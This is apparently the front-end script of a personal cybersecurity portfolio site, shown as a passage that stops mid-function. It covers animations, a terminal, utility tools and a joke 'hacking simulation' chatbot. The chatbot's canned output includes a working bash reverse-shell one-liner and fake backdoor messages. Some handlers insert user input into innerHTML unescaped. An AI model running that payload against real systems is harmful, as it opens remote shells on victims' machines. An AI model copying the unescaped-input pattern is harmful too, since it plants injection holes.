// signed: Amir Javarsineh
/*
    File: main.js
    Purpose: handles boot screen, observers, UI interactions, and interactive terminal
*/

// Boot Screen Animation
document.addEventListener('DOMContentLoaded', () => {
    const bootScreen = document.getElementById('bootScreen');
    
    // Hide boot screen after animation completes
    setTimeout(() => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
        }, 500);
    }, 6000);
    
    // Allow skipping with any key press or click
    const skipBoot = () => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
        }, 500);
    };
    
    document.addEventListener('keydown', skipBoot, { once: true });
    bootScreen.addEventListener('click', skipBoot, { once: true });
});

// Observer for fade-in elements
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -100px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

document.querySelectorAll('.fade-in').forEach(el => {
    el.style.opacity = '0';
    el.style.transform = 'translateY(20px)';
    el.style.transition = 'all 0.6s ease-out';
    observer.observe(el);
});

// Skill bars animation (fixed)
const skillObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const progressBars = entry.target.querySelectorAll('.skill-progress');
            progressBars.forEach(bar => {
                let width = bar.style.width;
                if (!width) {
                    width = getComputedStyle(bar).width;
                }
                bar.style.width = '0%';
                setTimeout(() => {
                    bar.style.width = width;
                }, 100);
            });
            skillObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.5 });

document.querySelectorAll('.skill-category').forEach(category => {
    skillObserver.observe(category);
});

// Mobile menu toggle
function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    navLinks.classList.toggle('active');
}

function closeMenu() {
    const navLinks = document.getElementById('navLinks');
    navLinks.classList.remove('active');
}

// Smooth scroll for anchor links
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('a[href^="#"]').forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href !== '#') {
                e.preventDefault();
                const target = document.querySelector(href);
                if (target) {
                    const offset = 80;
                    const targetPosition = target.offsetTop - offset;
                    window.scrollTo({
                        top: targetPosition,
                        behavior: 'smooth'
                    });
                }
            }
        });
    });

    const lazyObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                lazyObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.1 });

    document.querySelectorAll('section').forEach(section => {
        section.classList.add('lazy-section');
        lazyObserver.observe(section);
    });
});

let scrollTimeout;
window.addEventListener('scroll', () => {
    if (scrollTimeout) {
        clearTimeout(scrollTimeout);
    }
    scrollTimeout = setTimeout(() => {
        document.body.style.overflowY = 'auto';
    }, 150);
}, { passive: true });



// End of file - signed: Amir Javarsineh



// ============================================
// Typewriter Effect for Tagline
// ============================================
(function initTypewriter() {
    const element = document.getElementById('typewriter');
    if (!element) return;
    
    const phrases = [
        "// CyberSecurity Engineer",
        "// Network Engineer",
        "// Web Developer"
    ];
    
    let phraseIndex = 0;
    let charIndex = 0;
    let isDeleting = false;
    let currentText = '';
    
    function typeEffect() {
        const fullText = phrases[phraseIndex];
        
        if (isDeleting) {
            currentText = fullText.substring(0, charIndex - 1);
            charIndex--;
        } else {
            currentText = fullText.substring(0, charIndex + 1);
            charIndex++;
        }
        
        element.textContent = currentText;
        
        if (!isDeleting && charIndex === fullText.length) {
            // Pause before deleting
            isDeleting = true;
            setTimeout(typeEffect, 2000);
            return;
        }
        
        if (isDeleting && charIndex === 0) {
            isDeleting = false;
            phraseIndex = (phraseIndex + 1) % phrases.length;
            setTimeout(typeEffect, 500);
            return;
        }
        
        const speed = isDeleting ? 50 : 100;
        setTimeout(typeEffect, speed);
    }
    
    // Start the effect after a short delay
    setTimeout(typeEffect, 500);
})();   






// ============================================
// Fullscreen Terminal Mode
// ============================================
(function initFullscreenTerminal() {
    const openBtn = document.getElementById('fullscreenTerminalBtn');
    const overlay = document.getElementById('fullscreenTerminal');
    const closeBtn = document.getElementById('closeFullscreenTerminal');
    const inputEl = document.getElementById('fullscreenInput');
    const terminalBody = document.getElementById('fullscreenTerminalBody');
    
    if (!openBtn || !overlay || !closeBtn || !inputEl || !terminalBody) return;
    
    // Same commands as interactive terminal
    const commands = {
        help: () => {
            return `Available commands:<br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">skills</span> : List technical skills<br>
- <span class="cmd-highlight">contact</span> : Show contact info<br>
- <span class="cmd-highlight">clear</span> : Clear terminal screen<br>
- <span class="cmd-highlight">whoami</span> : About me<br>
- <span class="cmd-highlight">exit</span> : Close fullscreen mode`;
        },
        skills: () => {
            return `CyberSecurity: Network Security | Penetration Testing | SOC | Vuln Assessment | Wireshark <br> <br>
Networking: Network Eng | CCNA | TCP/IP | Firewall/VPN | Routing | VLANs<br> <br>
SysAdmin: Windows Server | AD | GPO | DNS/DHCP | VMware | Virtualization | Hyper-V<br> <br>
Programming: Python | C | OOP | Data Structures | Linux | Git<br> <br>
Backend/Database: Django | MySQL | PostgreSQL | DBMS<br> <br>
Frontend: HTML/CSS | JS | Bootstrap/Tailwind | SASS| jQuery/AJAX`;
        },
        contact: () => {
            return `Email: amirjavarsineh7@gmail.com<br>
GitHub: github.com/amirjavarsineh<br>
LinkedIn: linkedin.com/in/amirjavarsineh<br>
Telegram: @amirjavarsineh`;
        },
        whoami: () => {
            return `Amir Javarsineh (امیر جاورسینه)<br>
CyberSecurity Engineer, Network Engineer & Web Developer based in Iran.<br>
Passionate about building secure systems and creative coding.`;
        },
        exit: () => {
            overlay.classList.remove('open');
            document.body.style.overflow = '';
            return null;
        }
    };
    
    function addLine(text, isOutput = true) {
        const lineDiv = document.createElement('div');
        lineDiv.className = 'term-line';
        if (isOutput && text !== null) {
            lineDiv.innerHTML = `<span class="terminal-output">${text}</span>`;
        } else if (text !== null) {
            lineDiv.innerHTML = text;
        }
        if (text !== null) {
            terminalBody.insertBefore(lineDiv, terminalBody.lastElementChild);
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
        return lineDiv;
    }
    
    function executeCommand(cmd) {
        const cmdLower = cmd.trim().toLowerCase();
        if (cmdLower === 'clear') {
            const lines = terminalBody.querySelectorAll('.term-line:not(:last-child)');
            lines.forEach(line => line.remove());
            return;
        }
        let response = '';
        if (commands[cmdLower]) {
            response = commands[cmdLower]();
            if (response === null) return;
        } else if (cmdLower !== '') {
            response = `Command not found: ${cmd}. Type <span class="cmd-highlight">help</span> for available commands.`;
        }
        if (response) {
            addLine(response, true);
        }
    }
    
    function handleKey(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            const cmd = inputEl.innerText;
            if (cmd.trim() !== '') {
                const cmdLine = document.createElement('div');
                cmdLine.className = 'term-line';
                cmdLine.innerHTML = `<span class="prompt">$</span> ${cmd}`;
                terminalBody.insertBefore(cmdLine, terminalBody.lastElementChild);
                executeCommand(cmd);
            }
            inputEl.innerText = '';
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    }
    
    function openFullscreen() {
        overlay.classList.add('open');
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            inputEl.focus();
        }, 100);
    }
    
    function closeFullscreen() {
        overlay.classList.remove('open');
        document.body.style.overflow = '';
        // Optionally clear terminal or keep as is
    }
    
    openBtn.addEventListener('click', openFullscreen);
    closeBtn.addEventListener('click', closeFullscreen);
    inputEl.addEventListener('keydown', handleKey);
    terminalBody.addEventListener('click', () => {
        inputEl.focus();
    });
    
    // Close on ESC key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && overlay.classList.contains('open')) {
            closeFullscreen();
        }
    });
})();








// ============================================
// Firewall Log Simulator (Typewriter effect)
// ============================================
// (function initFirewallLog() {
//     const logContainer = document.getElementById('logTerminal');
//     const generateBtn = document.getElementById('generateLogBtn');
    
//     if (!logContainer || !generateBtn) return;

//     // لیست پیام‌های جعلی لاگ فایروال
//     const logMessages = [
//         "[BLOCKED] 192.168.1.105:443 -> Suspicious traffic detected",
//         "[ALLOWED] 10.0.0.22:80 -> HTTP request to example.com",
//         "[BLOCKED] 203.0.113.5:22 -> SSH brute force attempt",
//         "[ALERT] Intrusion Prevention System: Port scan from 45.33.22.11",
//         "[BLOCKED] 198.51.100.67:3389 -> RDP access denied",
//         "[INFO] Outbound connection to 93.184.216.34:443 (HTTPS) allowed",
//         "[BLOCKED] 192.168.1.77:53 -> DNS tunneling attempt",
//         "[ALERT] High severity: Multiple failed logins from 10.10.0.8",
//         "[ALLOWED] 172.16.5.9:12345 -> NTP traffic",
//         "[BLOCKED] 185.130.5.253:8080 -> Probe against proxy service"
//     ];
    
//     // تابع برای تولید یک لاگ جدید (با افکت تایپ)
//     function addLogWithTyping(text) {
//         const lineDiv = document.createElement('div');
//         lineDiv.className = 'log-line';
//         lineDiv.textContent = '';  // شروع خالی
//         logContainer.appendChild(lineDiv);
        
//         let i = 0;
//         function typeNextChar() {
//             if (i < text.length) {
//                 lineDiv.textContent += text.charAt(i);
//                 i++;
//                 setTimeout(typeNextChar, 20 + Math.random() * 15); // سرعت متغیر بین 20-35 میلی‌ثانیه
//             } else {
//                 // اسکرول خودکار به پایین
//                 logContainer.scrollTop = logContainer.scrollHeight;
//             }
//         }
//         typeNextChar();
//     }
    
//     // تابع تولید لاگ تصادفی
//     function generateRandomLog() {
//         const randomIndex = Math.floor(Math.random() * logMessages.length);
//         let message = logMessages[randomIndex];
        
//         // اضافه کردن timestamp جعلی
//         const now = new Date();
//         const timestamp = `[${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}]`;
        
//         const fullLog = `${timestamp} ${message}`;
//         addLogWithTyping(fullLog);
//     }
    
//     // رویداد کلیک روی دکمه
//     generateBtn.addEventListener('click', () => {
//         generateRandomLog();
//     });
    
//     // (اختیاری) تولید یک لاگ اولیه خوش‌آمدگویی تایپ‌شده
//     setTimeout(() => {
//         addLogWithTyping(`[${new Date().toISOString().slice(0,19).replace('T',' ')}] [INFO] Firewall log simulator ready.`);
//     }, 500);
// })();












// ============================================
// Hacker Chatbot (Simple Interactive)
// ============================================
(function initHackerChatbot() {
    const messagesDiv = document.getElementById('chatbotMessages');
    const inputEl = document.getElementById('chatbotInput');
    const sendBtn = document.getElementById('chatbotSendBtn');
    const clearBtn = document.getElementById('chatbotClearBtn');
    
    if (!messagesDiv || !inputEl || !sendBtn) return;
    
    function addMessage(text, type = 'bot') {
        const msgDiv = document.createElement('div');
        msgDiv.className = `chatbot-message ${type}`;
        msgDiv.innerHTML = type === 'bot' ? `> ${text}` : `> ${text}`;
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
        return msgDiv;
    }
    
    function processCommand(cmd) {
        const lower = cmd.trim().toLowerCase();
        
        const responses = {
            help: () => `Available commands:<br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">whoami</span> : About this bot<br>
- <span class="cmd-highlight">hack</span> : Simulate a hack attempt<br>
- <span class="cmd-highlight">scan</span> : Port scan simulation<br>
- <span class="cmd-highlight">clear</span> : Clear chat<br>
- <span class="cmd-highlight">exit</span> : Close (just for fun)`,
            
            whoami: () => `I am AI_H4CK3R, a simulated hacking assistant. I don't do real hacking.`,
            
            hack: () => `[!] Accessing mainframe...<br>[!] Bypassing firewall...<br>[✗] ACCESS DENIED. Your IP has been logged. (just kidding)`,
            
            scan: () => `[🔍] Scanning 127.0.0.1 ports...<br>Port 22: <span style="color:#0f0">OPEN</span> (SSH)<br>Port 80: <span style="color:#0f0">OPEN</span> (HTTP)<br>Port 443: <span style="color:#0f0">OPEN</span> (HTTPS)<br>Port 3306: <span style="color:#f44">FILTERED</span><br>Scan complete.`,
            
            clear: () => {
                messagesDiv.innerHTML = '';
                addMessage('Chat cleared. Type <span class="cmd-highlight">help</span>', 'bot');
                return null;
            },
            
            exit: () => {
                addMessage('Nice try. But you cannot escape the matrix.', 'bot');
                return null;
            }
        };
        
        if (responses[lower]) {
            return responses[lower]();
        } else if (lower !== '') {
            return `Unknown command: ${cmd}. Type <span class="cmd-highlight">help</span>.`;
        }
        return null;
    }
    
    function handleUserMessage() {
        const userText = inputEl.value.trim();
        if (userText === '') return;
        
        addMessage(userText, 'user');
        inputEl.value = '';
        
        const response = processCommand(userText);
        if (response) {
            setTimeout(() => {
                addMessage(response, 'bot');
            }, 200);
        }
    }
    
    sendBtn.addEventListener('click', handleUserMessage);
    inputEl.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleUserMessage();
    });
    
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared by user.', 'bot');
        });
    }
    
    inputEl.focus();
})();






// ============================================
// Hero Chatbot (Replaces interactive terminal)
// ============================================

(function initHeroChatbot() {
    const messagesDiv = document.getElementById('chatbotHeroMessages');
    const inputEl = document.getElementById('chatbotHeroInput');
    const sendBtn = document.getElementById('chatbotHeroSendBtn');
    const clearBtn = document.getElementById('chatbotClearHeroBtn');
    
    if (!messagesDiv || !inputEl || !sendBtn) return;
    
    const commands = {
        help: () => `Available commands:<br>
<span class="cmd-highlight">📌 General</span><br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">skills</span> : List technical skills<br>
- <span class="cmd-highlight">contact</span> : Show contact info<br>
- <span class="cmd-highlight">whoami</span> : About me<br>
- <span class="cmd-highlight">clear</span> : Clear chat<br>
<br>
<span class="cmd-highlight">💀 Hacking Simulations</span><br>
- <span class="cmd-highlight">nmap &lt;target&gt;</span> : Port scan simulation<br>
- <span class="cmd-highlight">hydra &lt;service&gt;</span> : Brute-force simulation<br>
- <span class="cmd-highlight">sqlmap &lt;url&gt;</span> : SQL injection simulation<br>
- <span class="cmd-highlight">exploit</span> : Launch a random exploit<br>
- <span class="cmd-highlight">reverse-shell</span> : Fake reverse shell<br>
- <span class="cmd-highlight">crack &lt;hash&gt;</span> : Crack a fake hash<br>
- <span class="cmd-highlight">enum</span> : Enumerate system info<br>
- <span class="cmd-highlight">pwn</span> : Attempt to pwn target<br>
- <span class="cmd-highlight">backdoor</span> : Install fake backdoor<br>
- <span class="cmd-highlight">persistence</span> : Establish persistence<br>
- <span class="cmd-highlight">root</span> : Privilege escalation`,

        skills: () => `<span class="cmd-highlight">🔹 CyberSecurity</span><br>
- Network Security <br>
- Penetration Testing / CEH <br>
- SOC Operations <br>
- Vulnerability Assessment <br>
- Wireshark <br><br>
<span class="cmd-highlight">🔹 Networking</span><br>
- Network Engineering <br>
- Cisco / CCNA <br>
- TCP/IP & Subnetting <br>
- Firewall & VPN <br>
- Routing & Switching <br>
- VLANs <br><br>
<span class="cmd-highlight">🔹 System Administration</span><br>
- Windows Server <br>
- Active Directory <br>
- Group Policy / GPO <br>
- DNS / DHCP Server <br>
- VMware ESXi <br>
- Server Virtualization <br>
- Hyper-V <br><br>
<span class="cmd-highlight">🔹 Programming</span><br>
- Python <br>
- C <br>
- OOP <br>
- Data Structures <br>
- Linux <br>
- Git <br><br>
<span class="cmd-highlight">🔹 Backend & Database</span><br>
- Django <br>
- MySQL <br>
- PostgreSQL <br>
- DBMS <br><br>
<span class="cmd-highlight">🔹 Frontend</span><br>
- HTML5 / CSS3 <br>
- JavaScript <br>
- Bootstrap / Tailwind <br>
- SASS <br>
- jQuery / AJAX`,

        contact: () => `Email: amirjavarsineh7@gmail.com<br>
GitHub: github.com/amirjavarsineh<br>
LinkedIn: linkedin.com/in/amirjavarsineh<br>
Telegram: @amirjavarsineh`,

        whoami: () => `Amir Javarsineh (امیر جاورسینه)<br>
CyberSecurity Engineer, Network Engineer & Web Developer based in Iran.<br>
Passionate about building secure systems and creative coding.`,

        clear: () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared. Type <span class="cmd-highlight">help</span>', 'bot');
            return null;
        },

        // ---------- دستورات هکری ----------
        nmap: (target) => {
            if (!target) return 'Usage: nmap &lt;target&gt; (e.g., nmap 192.168.1.1)<br>🔍 Simulating port scan...';
            return `[🔍] Scanning ${target}...<br>
[+] Port 22/tcp: <span style="color:#0f0">OPEN</span> (SSH)<br>
[+] Port 80/tcp: <span style="color:#0f0">OPEN</span> (HTTP)<br>
[+] Port 443/tcp: <span style="color:#0f0">OPEN</span> (HTTPS)<br>
[+] Port 3306/tcp: <span style="color:#f44">FILTERED</span> (MySQL)<br>
[*] Scan completed. 3 ports open, 1 filtered.`;
        },

        hydra: (service) => {
            if (!service) return 'Usage: hydra &lt;service&gt; (e.g., hydra ssh)<br>💀 Simulating brute-force...';
            if (service.toLowerCase() === 'ssh') {
                return `[💀] Hydra attacking SSH...<br>
[INFO] Target: 192.168.1.1<br>
[INFO] Attempting admin → <span style="color:#f44">FAILED</span><br>
[INFO] Attempting password → <span style="color:#f44">FAILED</span><br>
[INFO] Attempting root → <span style="color:#0f0">SUCCESS</span><br>
[✔] Password found: root`;
            }
            return `[💀] Hydra attacking ${service}...<br>[!] Service simulation not detailed. Try "hydra ssh".`;
        },

        sqlmap: (url) => {
            if (!url) return 'Usage: sqlmap &lt;url&gt; (e.g., sqlmap http://test.com?id=1)<br>💉 Simulating SQL injection...';
            return `[💉] sqlmap on ${url}<br>
[INFO] Parameter 'id' is vulnerable (MySQL)<br>
[INFO] Extracting database: testdb<br>
[INFO] Dumping table 'users'... admin:5f4dcc3b5aa765d61d8327deb882cf99<br>
[✔] Data retrieved.`;
        },

        exploit: () => {
            const exploits = [
                'CVE-2024-1234: Remote Code Execution <span style="color:#0f0">SUCCESS</span>',
                'MS17-010 (EternalBlue): Meterpreter session opened',
                'CVE-2021-44228 (Log4Shell): Reverse shell obtained'
            ];
            return `[⚡] Launching exploit...<br>${exploits[Math.floor(Math.random() * exploits.length)]}<br>[!] Educational simulation.`;
        },

        'reverse-shell': () => {
            return `[🌀] Generating reverse shell...<br>
[+] Payload: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1<br>
[+] Listener started on port 4444<br>
<span style="color:#0f0">[✔] Connection received! Shell: root@target</span><br>
[*] Simulation only.`;
        },

        crack: (hash) => {
            if (!hash) return 'Usage: crack &lt;hash&gt;<br>🔓 Simulating hash cracking...';
            const fakeDb = {
                '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
                '21232f297a57a5a743894a0e4a801fc3': 'admin'
            };
            if (fakeDb[hash]) return `[🔓] Hash ${hash} cracked: <span style="color:#0f0">${fakeDb[hash]}</span>`;
            return `[🔓] Hash ${hash} not found in rainbow table.`;
        },

        enum: () => {
            return `[🔍] Enumeration...<br>
OS: Linux target 5.15.0<br>
User: www-data (uid=33)<br>
Suid binaries: /bin/su, /usr/bin/sudo<br>
Cron jobs: backup.sh every 5 min<br>
[*] Enumeration complete.`;
        },

        pwn: () => {
            const outcomes = ['<span style="color:#0f0">[✔] Target pwned! Root access.</span>', '<span style="color:#f44">[✗] Failed. EDR blocked.</span>'];
            return `[💀] Attempting pwn...<br>${outcomes[Math.floor(Math.random() * outcomes.length)]}`;
        },

        backdoor: () => {
            return `[🌀] Installing backdoor...<br>
[+] Webshell at /var/www/html/shell.php<br>
<span style="color:#0f0">[✔] Backdoor active. Password: h4x0r</span>`;
        },

        persistence: () => {
            return `[🔄] Persistence...<br>
[+] Systemd service evil.service created<br>
[+] SSH key added<br>
<span style="color:#0f0">[✔] Persistence established.</span>`;
        },

        root: () => {
            return `[👑] Privilege escalation via Dirty Pipe...<br>
<span style="color:#0f0">[✔] You are now root! 🎉</span><br>
[*] Simulation only.`;
        }
    };
    
    function addMessage(text, type = 'bot') {
        const msgDiv = document.createElement('div');
        msgDiv.className = `chatbot-message ${type}`;
        msgDiv.innerHTML = type === 'bot' ? `> ${text}` : `> ${text}`;
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
        return msgDiv;
    }
    
    function processCommand(cmd) {
        const trimmed = cmd.trim();
        if (trimmed === '') return null;
        const lower = trimmed.toLowerCase();
        
        // دستورات بدون آرگومان
        const noArgCommands = ['clear', 'exploit', 'reverse-shell', 'enum', 'pwn', 'backdoor', 'persistence', 'root'];
        if (noArgCommands.includes(lower)) {
            if (lower === 'clear') return commands.clear();
            return commands[lower]();
        }
        
        // دستورات با آرگومان
        const parts = lower.split(/\s+/);
        const mainCmd = parts[0];
        const arg = parts.slice(1).join(' ');
        
        if (mainCmd === 'nmap' && commands.nmap) return commands.nmap(arg);
        if (mainCmd === 'hydra' && commands.hydra) return commands.hydra(arg);
        if (mainCmd === 'sqlmap' && commands.sqlmap) return commands.sqlmap(arg);
        if (mainCmd === 'crack' && commands.crack) return commands.crack(arg);
        
        // دستورات عمومی بدون آرگومان (help, skills, contact, whoami)
        if (commands[lower]) return commands[lower]();
        
        return `Unknown command: ${cmd}. Type <span class="cmd-highlight">help</span>.`;
    }
    
    function handleUserMessage() {
        const userText = inputEl.value.trim();
        if (userText === '') return;
        addMessage(userText, 'user');
        inputEl.value = '';
        const response = processCommand(userText);
        if (response) setTimeout(() => addMessage(response, 'bot'), 200);
    }
    
    sendBtn.addEventListener('click', handleUserMessage);
    inputEl.addEventListener('keypress', e => { if (e.key === 'Enter') handleUserMessage(); });
    
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared by user.', 'bot');
        });
    }
    
    inputEl.focus();
})();






// ============================================
// Matrix Digital Clock (live update)
// ============================================
(function initMatrixDigitalClock() {
    const timeSpan = document.getElementById('clockTime');
    const dateSpan = document.getElementById('clockDate');
    if (!timeSpan || !dateSpan) return;
    
    function updateClock() {
        const now = new Date();
        // ساعت و دقیقه و ثانیه با فرمت ۲ رقمی
        const hours = String(now.getHours()).padStart(2, '0');
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const seconds = String(now.getSeconds()).padStart(2, '0');
        timeSpan.textContent = `${hours}:${minutes}:${seconds}`;
        
        // تاریخ به فرمت YYYY/MM/DD
        const year = now.getFullYear();
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const day = String(now.getDate()).padStart(2, '0');
        dateSpan.textContent = `${year}/${month}/${day}`;
    }
    
    updateClock();
    setInterval(updateClock, 1000);
})();






// ============================================
// Useful Tools: Complete Set (with accurate date converter)
// ============================================

(function initUsefulTools() {
    // ---------- 1. Subnet Calculator ----------
    const subnetBtn = document.getElementById('calcSubnetBtn');
    const subnetIp = document.getElementById('subnetIp');
    const subnetCidr = document.getElementById('subnetCidr');
    const subnetOutput = document.getElementById('subnetOutput');
    
    function calculateSubnet(ip, cidr) {
        const cidrNum = parseInt(cidr);
        if (isNaN(cidrNum) || cidrNum < 0 || cidrNum > 32) return 'Invalid CIDR (0-32)';
        const ipParts = ip.split('.').map(Number);
        if (ipParts.length !== 4 || ipParts.some(p => isNaN(p) || p < 0 || p > 255)) return 'Invalid IP address';
        
        const mask = (0xFFFFFFFF << (32 - cidrNum)) >>> 0;
        const ipInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
        const networkInt = ipInt & mask;
        const broadcastInt = networkInt | (~mask >>> 0);
        const firstHost = networkInt + 1;
        const lastHost = broadcastInt - 1;
        const totalHosts = broadcastInt - networkInt - 1;
        
        function intToIp(int) {
            return [(int >>> 24) & 255, (int >>> 16) & 255, (int >>> 8) & 255, int & 255].join('.');
        }
        
        return `
Network Address: ${intToIp(networkInt)}<br>
Broadcast: ${intToIp(broadcastInt)}<br>
First Usable: ${intToIp(firstHost)}<br>
Last Usable: ${intToIp(lastHost)}<br>
Total Hosts: ${totalHosts}<br>
Wildcard Mask: ${intToIp(~mask >>> 0)}
        `;
    }
    if (subnetBtn) {
        subnetBtn.addEventListener('click', () => {
            subnetOutput.innerHTML = calculateSubnet(subnetIp.value.trim(), subnetCidr.value.trim());
        });
        subnetBtn.click();
    }

    // ---------- 2. IPv4 ↔ Binary ----------
    const ipInput = document.getElementById('ipInput');
    const binaryOutput = document.getElementById('binaryOutput');
    const ipToBinaryBtn = document.getElementById('ipToBinaryBtn');
    const binaryInput = document.getElementById('binaryInput');
    const ipOutput = document.getElementById('ipOutput');
    const binaryToIpBtn = document.getElementById('binaryToIpBtn');
    
    function isValidIp(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return false;
        return parts.every(part => {
            const num = parseInt(part, 10);
            return !isNaN(num) && num >= 0 && num <= 255 && part === num.toString();
        });
    }
    function ipToBinary(ip) {
        return ip.split('.').map(Number).map(p => p.toString(2).padStart(8, '0')).join('.');
    }
    function isValidBinary(bin) {
        const parts = bin.split('.');
        if (parts.length !== 4) return false;
        return parts.every(part => /^[01]{8}$/.test(part));
    }
    function binaryToIp(bin) {
        return bin.split('.').map(part => parseInt(part, 2)).join('.');
    }
    if (ipToBinaryBtn) {
        ipToBinaryBtn.addEventListener('click', () => {
            const ip = ipInput.value.trim();
            if (!isValidIp(ip)) {
                binaryOutput.innerHTML = '❌ Invalid IP address. Use format: 192.168.1.1';
                return;
            }
            binaryOutput.innerHTML = `<strong>Binary:</strong> ${ipToBinary(ip)}`;
        });
    }
    if (binaryToIpBtn) {
        binaryToIpBtn.addEventListener('click', () => {
            const bin = binaryInput.value.trim();
            if (!isValidBinary(bin)) {
                ipOutput.innerHTML = '❌ Invalid binary. Use 8 bits per octet separated by dots.';
                return;
            }
            ipOutput.innerHTML = `<strong>IP Address:</strong> ${binaryToIp(bin)}`;
        });
    }

    // ---------- 3. Password & Username Generator ----------
    const pwdBtn = document.getElementById('generatePwdBtn');
    const pwdLength = document.getElementById('pwdLength');
    const pwdOutput = document.getElementById('pwdOutput');
    const usernameBtn = document.getElementById('generateUsernameBtn');
    const usernameOutput = document.getElementById('usernameOutput');
    
    function generatePassword(len) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-[]{};:<>?';
        let pwd = '';
        for (let i = 0; i < len; i++) pwd += chars[Math.floor(Math.random() * chars.length)];
        return pwd;
    }
    function generateUsername() {
        const adjectives = ['Cool', 'Happy', 'Fast', 'Smart', 'Dark', 'Light', 'Cyber', 'Net', 'Safe', 'True'];
        const nouns = ['Hacker', 'Engineer', 'Dev', 'Admin', 'User', 'Geek', 'Master', 'Coder', 'Pro', 'Wizard'];
        const num = Math.floor(Math.random() * 1000);
        return adjectives[Math.floor(Math.random() * adjectives.length)] +
               nouns[Math.floor(Math.random() * nouns.length)] + num;
    }
    if (pwdBtn) {
        pwdBtn.addEventListener('click', () => {
            let len = parseInt(pwdLength.value);
            if (isNaN(len)) len = 12;
            len = Math.min(32, Math.max(4, len));
            pwdOutput.innerHTML = `<span style="word-break:break-all;">${generatePassword(len)}</span>`;
        });
        pwdBtn.click();
    }
    if (usernameBtn) {
        usernameBtn.addEventListener('click', () => {
            usernameOutput.innerHTML = `<span style="word-break:break-all;">${generateUsername()}</span>`;
        });
        usernameBtn.click();
    }

    // ---------- 4. Unit Converter ----------
    const convType = document.getElementById('convType');
    const convValue = document.getElementById('convValue');
    const fromUnit = document.getElementById('fromUnit');
    const toUnit = document.getElementById('toUnit');
    const convertBtn = document.getElementById('convertBtn');
    const convOutput = document.getElementById('convOutput');
    
    // تعریف واحدها و عوامل تبدیل به یکای پایه (SI یا مرجع)
    const unitSets = {
        length: {
            units: ['mm', 'cm', 'm', 'km', 'in', 'ft', 'yd', 'mile'],
            toBase: { mm:0.001, cm:0.01, m:1, km:1000, in:0.0254, ft:0.3048, yd:0.9144, mile:1609.344 },
            fromBase: (val, unit) => val / unitSets.length.toBase[unit]
        },
        weight: {
            units: ['mg', 'g', 'kg', 'ton', 'oz', 'lb'],
            toBase: { mg:0.000001, g:0.001, kg:1, ton:1000, oz:0.0283495, lb:0.453592 },
            fromBase: (val, unit) => val / unitSets.weight.toBase[unit]
        },
        temp: { special: true },  // handled separately
        time: {
            units: ['sec', 'min', 'hour', 'day', 'week'],
            toBase: { sec:1, min:60, hour:3600, day:86400, week:604800 },
            fromBase: (val, unit) => val / unitSets.time.toBase[unit]
        },
        speed: {
            units: ['m/s', 'km/h', 'mph', 'knot'],
            toBase: { 'm/s':1, 'km/h':0.2777777778, 'mph':0.44704, 'knot':0.5144444444 },
            fromBase: (val, unit) => val / unitSets.speed.toBase[unit]
        },
        volume: {
            units: ['ml', 'L', 'm3', 'ft3', 'gal_us'],
            toBase: { ml:0.000001, L:0.001, m3:1, ft3:0.0283168, gal_us:0.00378541 },
            fromBase: (val, unit) => val / unitSets.volume.toBase[unit]
        },
        area: {
            units: ['m2', 'km2', 'ft2', 'acre'],
            toBase: { m2:1, km2:1000000, ft2:0.092903, acre:4046.86 },
            fromBase: (val, unit) => val / unitSets.area.toBase[unit]
        },
        energy: {
            units: ['J', 'kJ', 'cal', 'kcal', 'Wh'],
            toBase: { J:1, kJ:1000, cal:4.184, kcal:4184, Wh:3600 },
            fromBase: (val, unit) => val / unitSets.energy.toBase[unit]
        },
        pressure: {
            units: ['Pa', 'kPa', 'bar', 'psi'],
            toBase: { Pa:1, kPa:1000, bar:100000, psi:6894.76 },
            fromBase: (val, unit) => val / unitSets.pressure.toBase[unit]
        }
    };
    
    function updateUnitOptions() {
        const type = convType.value;
        let units = [];
        if (type === 'length') units = unitSets.length.units;
        else if (type === 'weight') units = unitSets.weight.units;
        else if (type === 'temp') units = ['Celsius', 'Fahrenheit', 'Kelvin'];
